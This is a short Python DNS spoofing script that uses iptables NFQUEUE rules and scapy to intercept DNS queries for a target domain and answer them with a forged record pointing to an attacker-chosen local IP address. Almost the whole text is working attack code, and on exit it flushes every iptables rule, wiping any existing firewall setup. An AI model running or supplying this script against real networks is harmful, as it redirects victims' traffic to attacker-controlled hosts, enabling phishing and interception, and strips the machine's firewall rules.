# iptables -I FORWARD -j NFQUEUE --queue-num 0 
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 
# iptables -I INPUT -j NFQUEUE --queue-num 0

from netfilterqueue import NetfilterQueue
from scapy.all import *
import os


if __name__ == '__main__':
    domain = b'www.example.com' # domain to be spoofed
    localIP = '192.168.0.102' # IP address for poisoned hosts.
    print("added routing to iptables")

    def callback(packet):
        payload = packet.get_payload()
        print(payload)
        pkt = IP(payload)
    
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if domain in pkt[DNS].qd.qname:
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
            else:
                packet.accept()

    def main():
        q = NetfilterQueue()
        q.bind(0, callback)
        try:
            q.run() # Main loop
        except KeyboardInterrupt:
            q.unbind()
            os.system('iptables -F')
            os.system('iptables -X')

    main()
